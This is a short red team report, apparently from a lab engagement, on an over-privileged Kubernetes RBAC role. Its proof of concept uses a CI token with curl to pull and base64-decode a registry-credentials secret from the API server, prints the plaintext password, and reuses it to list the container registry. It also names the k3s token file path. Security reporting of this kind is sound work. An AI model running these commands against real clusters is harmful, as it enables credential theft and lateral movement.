# Red Team Report — CLD01-M03
## K8s RBAC Over-Privilege — Secrets Exfiltration via Container API
**Engagement:** Operation GRIDFALL | **Target:** cld-k8s (11.0.2.30:6443)

## Finding: Over-Privileged RBAC Role Exposes Kubernetes Secrets (Critical)
**CWE:** CWE-269 — Improper Privilege Management  
**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
**MITRE:** T1613, T1552.007

### Proof of Concept
```bash
TOKEN="pul-cloud-ci-runner-token-2024gridfall"
# Token should only have ConfigMap/Deployment read, but also has Secrets:
curl -sk -H "Authorization: Bearer ${TOKEN}" \
    https://11.0.2.30:6443/api/v1/namespaces/pul-cloud/secrets/registry-creds \
    | python3 -c "import sys,json,base64; d=json.load(sys.stdin)['data']; [print(k,'=',base64.b64decode(v).decode()) for k,v in d.items()]"
# username = registry-admin
# password = Reg!stry@CLD2024
# registry = 11.0.2.40:5000
```

### Pivot Confirmed
```bash
curl -u "registry-admin:Reg!stry@CLD2024" http://11.0.2.40:5000/v2/_catalog
# {"repositories":["pul-cloud/platform-svc"]}
```

## Artifacts
- K3s tokens: `/etc/rancher/k3s/tokens.csv`
- Misconfigured Role: `cloud-ci-runner-role` in `pul-cloud` namespace
- Stolen secret: `registry-creds` — registry-admin:Reg!stry@CLD2024
